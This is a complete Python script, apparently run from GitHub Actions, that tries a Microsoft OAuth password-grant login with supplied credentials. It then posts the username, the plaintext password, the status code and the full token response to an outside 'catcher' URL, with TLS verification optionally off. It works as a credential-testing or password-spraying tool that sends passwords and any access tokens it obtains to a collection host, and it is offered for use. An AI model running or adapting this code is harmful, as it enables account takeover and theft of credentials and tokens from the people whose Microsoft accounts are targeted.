import requests
import os
from urllib3.exceptions import InsecureRequestWarning

required_env_vars = ["USERNAME", "PASSWORD", "CATCHERURL", "CATCHERTLS"]
missing_env_vars = [var for var in required_env_vars if os.getenv(var) is None]

if missing_env_vars:
    missing_vars_str = ", ".join(missing_env_vars)
    raise ValueError(f"Missing environment variables: {missing_vars_str}")

# TODO: add target and other data here later to make this more modular
username = os.getenv("USERNAME")
password = os.getenv("PASSWORD")
catcher_URL = os.getenv("CATCHERURL")
catcher_uses_TLS_str = os.getenv("CATCHERTLS")
# Convert to catcher_uses_TLS_str to boolean
catcher_uses_TLS = catcher_uses_TLS_str.lower() == "true"


def send_login_request():
    url = "https://login.microsoft.com/common/oauth2/token"
    body_params = {
        "resource": "https://graph.windows.net",
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
        "client_info": "1",
        "grant_type": "password",
        "username": username,
        "password": password,
        "scope": "openid",
    }
    post_headers = {
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36.",
    }

    try:
        response = requests.post(
            url,
            headers=post_headers,
            data=body_params,
            timeout=5,
        )
        return response.status_code, response.text

    except requests.RequestException:
        return None, None


def send_data_to_catcher(data, use_ssl):
    if not use_ssl:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    try:
        response = requests.post(catcher_URL, json=data, timeout=3, verify=use_ssl)
        print("[+] Data sent to the catcher.")
    except requests.RequestException:
        print(f"[-] Failed to send data to the catcher.")


login_response_code, login_response = send_login_request()


data = {
    "username": username,
    "password": password,
}

if login_response_code is not None and login_response is not None:
    data["status_code"] = login_response_code
    data["response"] = login_response
else:
    data["status_code"] = 500
    data["response"] = "Github actions workflow failed to perform login request"

send_data_to_catcher(data, use_ssl=catcher_uses_TLS)
